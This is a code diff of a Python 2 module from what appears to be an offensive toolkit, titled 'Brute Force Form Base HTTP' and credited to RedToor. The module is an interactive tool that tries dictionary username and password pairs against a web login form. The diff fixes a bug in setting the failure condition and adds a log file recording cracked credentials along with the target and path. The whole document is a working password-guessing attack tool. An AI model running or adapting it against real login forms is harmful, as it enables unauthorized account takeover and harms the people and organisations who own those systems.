@@ -2,10 +2,12 @@
 # Brute Force Form Base HTTP
 # Script by RedToor
 # 28/02/2015
+
 import httplib,urllib
 import socket
 import sys
 from core import help
+import time
 W  = '\033[0m'  
 R  = '\033[31m' 
 G  = '\033[32m' 
@@ -24,31 +26,34 @@ defaultdat2="password"
 defaultmeth="POST"
 defaultcont="no"
 def httpformbasebruteforce():
-	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2,defaultdat1,defaultdat2,defaultmeth
-	actions = raw_input(B+"   web/formbt > "+W)
+	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2,defaultdat1,defaultdat2,defaultmeth,defaultcont
+	actions = raw_input(O+"     ktn/web/formbt > "+W)
 	if actions == "show options":
+		print ""
 		print "     ["+R+"+"+W+"] options"
-		print "     target         : yes"
-		print "     port           : no/yes"
-		print "     patch          : yes"
-		print "     params         : yes"
-		print "     condition      : yes"
-		print "     dictionaries   : no/yes\n"
+		print "     |target         : yes"
+		print "     |port           : no/yes"
+		print "     |patch          : yes"
+		print "     |params         : yes"
+		print "     |condition      : yes"
+		print "     |dictionaries   : no/yes\n"
+		print ""
 		print "     ["+G+"+"+W+"] options current"
-		print "     target         : ",defaulthost
-		print "     port           : ",defaultport
-		print "     patch          : ",defaultpach
-		print "     param_1        : ",defaultdat1
-		print "     param_2        : ",defaultdat2  
-		print "     method         : ",defaultmeth
-		print "     if!=condition  : ",defaultcont
-		print "     dictionary_1   : ",defaultdic1
-		print "     dictionary_2   : ",defaultdic2
+		print "     |target         : ",defaulthost
+		print "     |port           : ",defaultport
+		print "     |patch          : ",defaultpach
+		print "     |param_1        : ",defaultdat1
+		print "     |param_2        : ",defaultdat2  
+		print "     |method         : ",defaultmeth
+		print "     |[if!=]condition: ",defaultcont
+		print "     |dictionary_1   : ",defaultdic1
+		print "     |dictionary_2   : ",defaultdic2
+		print ""
 		httpformbasebruteforce()
 	elif actions=="back":
 		return 
 	elif actions=="exit":
-		print C+"   GooD"+W+" bye."
+		print C+"     GooD"+W+" bye."
 		exit()
 	elif actions[0:10] == "set target":
 			defaulthost = actions[11:]
@@ -63,7 +68,7 @@ def httpformbasebruteforce():
 			defaultpach = actions[10:]
 			print "     patch          : "+defaultpach+" "+O+"     Saved!!!"+W
 	elif actions[0:13] == "set condition":
-			defaultpach = actions[14:]
+			defaultcont = actions[14:]
 			print "     condition      : "+defaultcont+" "+O+"     Saved!!!"+W
 			httpformbasebruteforce()
 	elif actions[0:16] == "set dictionary_1":
@@ -100,7 +105,7 @@ def httpformbasebruteforce():
 		print "     method         : ",defaultmeth
 		print "     dictionary_1   : ",defaultdic1
 		print "     dictionary_2   : ",defaultdic2
-		print  
+		print ""
 		try:
 			red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
 			red.connect((defaulthost, int(defaultport))) 
@@ -121,12 +126,23 @@ def httpformbasebruteforce():
 									response = conn.getresponse()
 									ver_source = response.read()
 									if ver_source.find(defaultcont)<= 0:
-										print "     ["+G+"+"+W+"] SUCCESSFUL with "+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps
-										httpformbasebruteforce()
+										log=open('core/logs/logsBruteForce.log','a')
+										log.write('\n ===================================== ')
+										log.write('\n Module  : BruteForceFormBase')
+										log.write('\n Data    : '+time.strftime('%c'))
+										log.write('\n target  : '+defaulthost)
+										log.write('\n path    : '+defaultpach)
+										log.write('\n method  : '+defaultmeth)
+										log.write('\n Cracked : '+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps)
+										log.close()
+										print "     ["+G+"+"+W+"] Successfully with "+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps
+										return
 									else:
 										print "     ["+O+"!"+W+"] Checking with "+defaultdat1+" : "+us+" , "+defaultdat2+" : "+ps	
 				except(KeyboardInterrupt, SystemExit):
-					print("\n   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
+					print("\n     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
 		except:
-			print("     ["+R+"-"+W+"] target DEAD")
+			print("     ["+R+"-"+W+"] target off")
+	else:
+		print "     ["+O+"!"+W+"] command No Accept"+W
 	httpformbasebruteforce()
